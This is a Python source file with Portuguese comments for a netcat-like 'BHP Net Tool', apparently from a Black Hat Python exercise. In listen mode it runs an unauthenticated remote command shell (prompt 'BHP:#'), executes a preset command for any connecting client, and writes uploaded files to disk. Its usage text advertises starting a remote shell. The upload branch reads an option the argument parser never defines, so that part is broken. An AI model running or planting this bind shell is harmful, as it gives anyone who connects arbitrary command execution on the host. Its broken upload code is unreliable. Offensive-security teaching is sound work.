import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    """Executa comandos no sistema e retorna a saída."""
    cmd = cmd.strip()
    if not cmd:
        return
    try:
        output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar comando:\n{e.output.decode()}"


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        """Modo cliente: envia dados e recebe respostas."""
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response, end='')

                buffer = input('> ')
                buffer += '\n'
                self.socket.send(buffer.encode())

        except KeyboardInterrupt:
            print('Interrompido pelo usuário.')
            self.socket.close()
            sys.exit()

    def listen(self):
        """Modo servidor: escuta conexões e lida com elas."""
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        print(f"[*] Ouvindo em {self.args.target}:{self.args.port}...")

        while True:
            client_socket, addr = self.socket.accept()
            print(f"[*] Conexão recebida de {addr[0]}:{addr[1]}")
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_thread.start()

    def handle_client(self, client_socket):
        """Lida com uma conexão de cliente."""
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'arquivo salvo {self.args.upload}'
            client_socket.send(message.encode())
                    

        elif self.args.command:
            while True:
                try:
                    client_socket.send(b'BHP:# ')
                    cmd_buffer = ''
                    while '\n' not in cmd_buffer:
                        data = client_socket.recv(4096)
                        if not data:
                            break
                        cmd_buffer += data.decode()
                    response = execute(cmd_buffer)
                    if response:
                        client_socket.send(response.encode())
                except Exception as e:
                    print(f"Erro ao lidar com cliente: {e}")
                    break
        client_socket.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Exemplos de uso:
    netcat.py -t 192.168.1.108 -p 5555 -l -c           # Inicia uma shell remota (modo servidor)
    netcat.py -t 192.168.1.108 -p 5555 -l -e "ls -la" # Executa um comando ao receber conexão
    echo 'ABC' | python3 netcat.py -t 192.168.1.108 -p 135  # Envia texto para porta remota
    netcat.py -t 192.168.1.108 -p 5555                 # Conecta ao servidor remoto
    ''')
    )

    parser.add_argument('-c', '--command', action='store_true', help='Inicia um shell remoto')
    parser.add_argument('-e', '--execute', help='Executa um comando específico')
    parser.add_argument('-l', '--listen', action='store_true', help='Modo escuta (servidor)')
    parser.add_argument('-p', '--port', type=int, default=5555, help='Porta alvo')
    parser.add_argument('-t', '--target', default='0.0.0.0', help='IP alvo')
    args = parser.parse_args()

    if args.listen:
        buffer = None
    else:
        buffer = sys.stdin.read().encode() if not sys.stdin.isatty() else None

    nc = NetCat(args, buffer)
    nc.run()
